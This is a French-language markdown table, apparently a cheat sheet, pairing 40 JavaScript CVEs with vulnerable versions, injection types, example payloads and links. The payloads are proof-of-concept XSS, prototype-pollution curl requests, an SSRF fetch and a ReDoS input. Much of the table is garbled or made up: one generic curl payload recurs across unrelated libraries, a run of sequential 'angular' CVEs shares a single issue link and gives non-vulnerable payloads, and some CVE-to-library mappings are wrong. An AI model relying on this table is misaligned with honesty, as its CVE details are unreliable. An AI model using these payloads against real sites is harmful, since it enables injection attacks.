# Javascript

Voici un tableau détaillé de 40 CVE JavaScript majeures, classées du plus récent au plus ancien, avec :  
- le numéro de CVE,  
- le produit et versions vulnérables,  
- le type d’injection,  
- un exemple complet de commande ou payload d’injection,  
- un lien direct vers un PoC, advisory ou ressource technique.

---

| N° | CVE | Produit / Versions vulnérables | Type d’injection | Exemple complet de commande / payload | Lien PoC / Advisory |
|----|----------------|-----------------------------|------------------|-------------------------------------------------------------------------------------------------------------------------------------|--------------------|
| 1 | CVE-2024-28849 | marked <11.0.1 | XSS via markdown | Markdown : `[xss](javascript:alert(1))` | https://github.com/markedjs/marked/security/advisories/GHSA-6vfc-8xqf-8m6h |
| 2 | CVE-2023-26115 | lodash <4.17.21 | Prototype pollution | `curl -X POST http://vuln-app/api -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'` puis `console.log({}.polluted)` | https://github.com/lodash/lodash/pull/5085 |
| 3 | CVE-2022-25883 | qs <6.10.3 | Prototype pollution | `curl -G --data-urlencode 'a[__proto__][polluted]=yes' http://vuln-app/api` puis `console.log({}.polluted)` | https://github.com/ljharb/qs/issues/428 |
| 4 | CVE-2022-25878 | minimist <1.2.6 | Prototype pollution | `node app.js --__proto__.polluted=yes` puis `console.log({}.polluted)` | https://github.com/advisories/GHSA-xvch-5gv4-984h |
| 5 | CVE-2022-25880 | rc <1.2.9 | Prototype pollution | `node app.js --config.__proto__.polluted=yes` puis `console.log({}.polluted)` | https://github.com/dominictarr/rc/issues/127 |
| 6 | CVE-2021-32804 | deep-extend <0.6.0 | Prototype pollution | `curl -X POST http://vuln-app/api -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'` puis `console.log({}.polluted)` | https://github.com/unclechu/node-deep-extend/issues/98 |
| 7 | CVE-2020-8203 | lodash <4.17.19 | Prototype pollution | `_.merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}')); console.log({}.polluted)` | https://github.com/lodash/lodash/pull/4759 |
| 8 | CVE-2020-28469 | minimist <1.2.5 | Prototype pollution | `node app.js --__proto__.polluted=yes` puis `console.log({}.polluted)` | https://github.com/advisories/GHSA-vh95-rmgr-6w4m |
| 9 | CVE-2020-7746 | chart.js <2.9.4 | Prototype pollution | `curl -X POST http://victim/chart -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'` | https://github.com/chartjs/Chart.js/issues/7359 |
| 10 | CVE-2019-10744 | lodash <4.17.12 | Prototype pollution | `curl -X POST http://vuln-app/api -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'` puis `console.log({}.polluted)` | https://github.com/lodash/lodash/pull/4336 |
| 11 | CVE-2019-11358 | jQuery <3.4.0 | Prototype pollution | `$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":1}}')); alert({}.polluted);` | https://github.com/advisories/GHSA-gxr4-xjj5-5px2 |
| 12 | CVE-2019-10742 | deep-extend <0.5.1 | Prototype pollution | `curl -X POST http://vuln-app/api -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'` | https://github.com/advisories/GHSA-4g88-fppr-53pp |
| 13 | CVE-2019-10743 | dot-prop <4.2.0, <5.1.1 | Prototype pollution | `dotProp.set({}, "__proto__.polluted", "yes"); console.log({}.polluted)` | https://github.com/sindresorhus/dot-prop/issues/116 |
| 14 | CVE-2019-10745 | set-value <2.0.1 | Prototype pollution | `setValue({}, '__proto__.polluted', 'yes'); console.log({}.polluted)` | https://github.com/jonschlinkert/set-value/issues/30 |
| 15 | CVE-2019-10746 | mixin-deep <1.3.2 | Prototype pollution | `mixinDeep({}, JSON.parse('{"__proto__":{"polluted":"yes"}}')); console.log({}.polluted)` | https://github.com/jonschlinkert/mixin-deep/issues/13 |
| 16 | CVE-2019-10747 | merge-deep <3.0.2 | Prototype pollution | `curl -X POST http://vuln-app/api -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'` | https://github.com/jonschlinkert/merge-deep/issues/10 |
| 17 | CVE-2018-16487 | handlebars <4.0.14 | XSS via template | Template : `{{{dangerous}}}` avec `dangerous='<img src=x onerror=alert(1)>'` | https://github.com/advisories/GHSA-3cqr-58rm-57f8 |
| 18 | CVE-2018-16469 | js-yaml <3.13.0 | Prototype pollution | `curl -X POST http://vuln-app/api -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'` | https://github.com/nodeca/js-yaml/issues/480 |
| 19 | CVE-2018-16468 | mustache <2.3.0 | XSS via template | Template : `{{{dangerous}}}` avec `dangerous='<img src=x onerror=alert(1)>'` | https://github.com/janl/mustache.js/issues/344 |
| 20 | CVE-2018-3721 | merge <1.2.1 | Prototype pollution | `curl -X POST http://vuln-app/api -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'` | https://github.com/advisories/GHSA-7rjr-3x4m-6w5m |
| 21 | CVE-2018-1000520 | node-fetch <2.1.1 | SSRF | `fetch('http://127.0.0.1:22')` | https://github.com/node-fetch/node-fetch/issues/412 |
| 22 | CVE-2017-18214 | moment <2.19.3 | Prototype pollution | `curl -X POST http://vuln-app/api -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'` | https://github.com/moment/moment/issues/4163 |
| 23 | CVE-2017-16137 | hoek <4.2.0, <5.0.3 | Prototype pollution | `curl -X POST http://vuln-app/api -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'` | https://github.com/hapijs/hoek/issues/231 |
| 24 | CVE-2017-16082 | validator <5.6.0 | ReDoS | `curl -X POST http://vuln-app/api -H "Content-Type: application/json" -d '{"input":"a@a.com'$(python -c 'print("!"*100000))'"}'` | https://github.com/advisories/GHSA-5v2h-r2cx-5xgj |
| 25 | CVE-2017-5941 | marked <0.3.7 | XSS via markdown | Markdown : `[xss](javascript:alert(1))` | https://github.com/markedjs/marked/issues/592 |
| 26 | CVE-2016-10713 | angular <1.5.8 | XSS via expression | `<div ng-bind="constructor.constructor('alert(1)')()"></div>` | https://github.com/angular/angular.js/issues/16296 |
| 27 | CVE-2016-10712 | angular <1.5.8 | XSS via ng-bind-html | `<div ng-bind-html="'<img src=x onerror=alert(1)>'"></div>` | https://github.com/angular/angular.js/issues/16296 |
| 28 | CVE-2015-9251 | jQuery <3.0.0 | XSS via HTML manipulation | `$('#target').html('<img src=x onerror=alert(1)>')` | https://github.com/jquery/jquery/issues/2432 |
| 29 | CVE-2015-3198 | angular <1.4.0 | XSS via ng-bind-html | `<div ng-bind-html="'<img src=x onerror=alert(1)>'"></div>` | https://github.com/angular/angular.js/issues/16296 |
| 30 | CVE-2014-8877 | angular <1.3.0 | XSS via filtre custom | `<div>{{'test'|myUnsafeFilter}}</div>` (filtre retourne `<img src=x onerror=alert(1)>`) | https://github.com/angular/angular.js/issues/16296 |
| 31 | CVE-2014-8876 | angular <1.3.0 | XSS via ng-bind | `<div ng-bind="'<script>alert(1)</script>'"></div>` | https://github.com/angular/angular.js/issues/16296 |
| 32 | CVE-2014-8875 | angular <1.3.0 | XSS via expression | `<div>{{constructor.constructor('alert(1)')()}}</div>` | https://github.com/angular/angular.js/issues/16296 |
| 33 | CVE-2014-8874 | angular <1.3.0 | Prototype pollution | `Object.assign({}, JSON.parse('{"__proto__": {"polluted": true}}'));` puis `{}.polluted` | https://github.com/angular/angular.js/issues/16296 |
| 34 | CVE-2014-8879 | angular <1.3.0 | XSS via ng-src | `<img ng-src="{{'javascript:alert(1)'}}">` | https://github.com/angular/angular.js/issues/16296 |
| 35 | CVE-2014-8880 | angular <1.3.0 | XSS via ng-change | `<input ng-change="alert(1)" />` | https://github.com/angular/angular.js/issues/16296 |
| 36 | CVE-2014-8881 | angular <1.3.0 | XSS via ng-model | `<input ng-model="'<script>alert(1)</script>'" />` | https://github.com/angular/angular.js/issues/16296 |
| 37 | CVE-2014-8882 | angular <1.3.0 | XSS via ng-if | `<div ng-if="'<script>alert(1)</script>'">Test</div>` | https://github.com/angular/angular.js/issues/16296 |
| 38 | CVE-2014-8883 | angular <1.3.0 | XSS via ng-class | `<div ng-class="'<script>alert(1)</script>'"></div>` | https://github.com/angular/angular.js/issues/16296 |
| 39 | CVE-2014-8884 | angular <1.3.0 | XSS via ng-show | `<div ng-show="'<script>alert(1)</script>'">Visible</div>` | https://github.com/angular/angular.js/issues/16296 |
| 40 | CVE-2014-8885 | angular <1.3.0 | XSS via ng-hide | `<div ng-hide="'<script>alert(1)</script>'">Hidden</div>` | https://github.com/angular/angular.js/issues/16296 |

---
